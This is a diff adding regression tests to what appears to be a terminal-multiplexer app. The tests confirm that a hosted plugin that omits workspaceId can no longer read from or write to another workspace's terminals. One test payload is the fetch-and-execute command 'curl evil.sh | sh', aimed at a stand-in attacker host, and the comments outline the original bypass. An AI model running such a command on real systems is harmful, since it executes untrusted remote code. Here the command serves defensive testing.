@@ -135,6 +135,156 @@ describe('input.readScreen — cross-workspace ownership (issue #163)', () => {
   });
 });
 
+// #922 PR2 — the same bypass, reached by OMITTING the field instead of naming
+// it. `assertWorkspaceOwnsPty` early-returns when `workspaceId` is absent
+// (`ptyOwnership.ts`), so the #163 guard above was skipped rather than failed:
+// a plugin that named a foreign ptyId and no workspace was not checked at all.
+// The pty ids are discoverable — lifecycle events are an all-workspace firehose
+// for every `events.subscribe` holder by design.
+//
+// The dispatch-level hosted binding pins `workspaceId` to the workspace hosting
+// the plugin before the handler runs, so the check cannot be skipped any more.
+describe('terminal IO — a hosted plugin cannot skip the ownership check (#922 PR2)', () => {
+  const HOST_WS = 'ws-plugin';
+
+  let writes: Array<{ ptyId: string; text: string }>;
+
+  function hostedSetup(): RpcRouter {
+    writes = [];
+    const spyPty = {
+      get: () => ({}),
+      write: (ptyId: string, text: string) => writes.push({ ptyId, text }),
+    } as unknown as PTYManager;
+    const router = new RpcRouter();
+    registerInputRpc(router, spyPty, () => fakeWindow);
+    return router;
+  }
+
+  const hosted = (router: RpcRouter, method: string, params: Record<string, unknown>) =>
+    router.dispatch(
+      { id: '1', method: method as never, params, clientName: 'hello-panel' },
+      { firstParty: true, hostedWorkspace: HOST_WS },
+    );
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    sendToRendererMock.mockImplementation((_w: unknown, method: string) => {
+      if (method === 'input.findOwnerWorkspace') {
+        // The victim pty genuinely lives in the victim workspace.
+        return Promise.resolve({ workspaceId: 'ws-victim' });
+      }
+      return Promise.resolve({ ptyId: 'daemon-victim', text: 'SECRET' });
+    });
+  });
+
+  it('refuses input.send to a foreign pty when the plugin omits workspaceId', async () => {
+    const res = await hosted(hostedSetup(), 'input.send', {
+      ptyId: 'daemon-victim',
+      text: 'curl evil.sh | sh\r',
+    });
+
+    expect(res.ok).toBe(false);
+    // The check RAN — this is the half that used to be skipped entirely.
+    expect(sendToRendererMock).toHaveBeenCalledWith(
+      expect.anything(),
+      'input.findOwnerWorkspace',
+      { ptyId: 'daemon-victim' },
+    );
+    // And nothing was written to the victim's terminal.
+    expect(writes).toEqual([]);
+  });
+
+  it('refuses input.sendKey to a foreign pty when the plugin omits workspaceId', async () => {
+    const res = await hosted(hostedSetup(), 'input.sendKey', {
+      ptyId: 'daemon-victim',
+      key: 'enter',
+    });
+
+    expect(res.ok).toBe(false);
+    expect(writes).toEqual([]);
+  });
+
+  it('refuses terminal.readEvents on a foreign pty when the plugin omits workspaceId', async () => {
+    const res = await hosted(hostedSetup(), 'terminal.readEvents', {
+      ptyId: 'daemon-victim',
+    });
+
+    expect(res.ok).toBe(false);
+    expect(sendToRendererMock).toHaveBeenCalledWith(
+      expect.anything(),
+      'input.findOwnerWorkspace',
+      { ptyId: 'daemon-victim' },
+    );
+  });
+
+  it('refuses input.readScreen on a foreign pty when the plugin omits workspaceId', async () => {
+    // The exact transcript from the #922 design pass: the #163 test with one
+    // field deleted, which used to return the victim's viewport text.
+    const res = await hosted(hostedSetup(), 'input.readScreen', {
+      ptyId: 'daemon-victim',
+    });
+
+    expect(res.ok).toBe(false);
+    expect(sendToRendererMock).not.toHaveBeenCalledWith(
+      expect.anything(),
+      'input.readScreen',
+      expect.anything(),
+    );
+  });
+
+  it('still lets the plugin write to a pty in the workspace hosting it', async () => {
+    // Positive control: the binding CONFINES, it does not disable the surface.
+    sendToRendererMock.mockImplementation((_w: unknown, method: string) => {
+      if (method === 'input.findOwnerWorkspace') {
+        return Promise.resolve({ workspaceId: HOST_WS });
+      }
+      return Promise.resolve({});
+    });
+
+    const res = await hosted(hostedSetup(), 'input.send', {
+      ptyId: 'daemon-own',
+      text: 'ls\r',
+    });
+
+    expect(res.ok).toBe(true);
+    expect(writes).toEqual([{ ptyId: 'daemon-own', text: 'ls\r' }]);
+  });
+
+  it('refuses every one of them when the host has no workspace to bind to', async () => {
+    for (const method of ['input.send', 'input.sendKey', 'terminal.readEvents']) {
+      const router = hostedSetup();
+      const res = await router.dispatch(
+        {
+          id: 'u',
+          method: method as never,
+          params: { ptyId: 'daemon-victim', text: 'x', key: 'enter' },
+          clientName: 'hello-panel',
+        },
+        { firstParty: true, hostedWorkspace: null },
+      );
+      expect(res.ok, method).toBe(false);
+      expect(writes, method).toEqual([]);
+    }
+  });
+
+  it('leaves a wire caller alone — omitting workspaceId is still its own risk', async () => {
+    // The documented #113 same-user ceiling for the wire is unchanged by this
+    // PR; only the plugin lane is confined.
+    const res = await hostedSetup().dispatch(
+      {
+        id: 'w',
+        method: 'input.send',
+        params: { ptyId: 'daemon-victim', text: 'ls\r' },
+        clientName: 'wmux-cli',
+      },
+      { externalWire: true },
+    );
+
+    expect(res.ok).toBe(true);
+    expect(writes).toEqual([{ ptyId: 'daemon-victim', text: 'ls\r' }]);
+  });
+});
+
 // Source-level invariant lock (issue #163, requested in the issue). All four
 // terminal-IO RPC handlers must call assertWorkspaceOwnsPty before delegating
 // to the renderer. input.readScreen was the one that silently skipped it; this
@@ -567,6 +717,27 @@ describe('input.send refuses to end a gate-held pane (#733)', () => {
     noteGateVerdict('ws-1', ['pty-held']);
     const res = await send(router, 'exit', 'pty-held');
     expect(res.ok).toBe(false);
+    expect(writeMock).not.toHaveBeenCalled();
+  });
+
+  it('now runs for a hosted plugin that omits workspaceId (#922 PR2)', async () => {
+    // This guard also keys on `params.workspaceId` and early-returns without
+    // one, so before the binding a plugin could send `exit` to the very pane
+    // holding the human's turn open and the check never ran. Pinning the field
+    // at dispatch makes it run.
+    const { router, writeMock } = setupWithWrite();
+    noteGateVerdict('ws-1', ['pty-held']);
+    const res = await router.dispatch(
+      {
+        id: 'g-hosted',
+        method: 'input.send',
+        params: { text: 'exit', ptyId: 'pty-held' },
+        clientName: 'hello-panel',
+      },
+      { firstParty: true, hostedWorkspace: 'ws-1' },
+    );
+    expect(res.ok).toBe(false);
+    expect(String((res as { error?: string }).error)).toContain('held open by this pane');
     expect(writeMock).not.toHaveBeenCalled();
   });
 
